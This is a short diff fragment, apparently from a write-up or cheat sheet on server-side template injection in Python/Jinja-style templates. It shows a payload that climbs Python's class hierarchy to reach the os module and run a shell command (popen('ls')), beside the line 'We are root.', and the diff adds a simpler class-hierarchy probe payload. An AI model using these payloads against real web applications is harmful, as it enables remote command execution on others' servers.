@@ -247,3 +247,6 @@ We are root.
 ```
 {{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
 ```
+
+test
+`{{ ''.__class__.__mro__ }}`
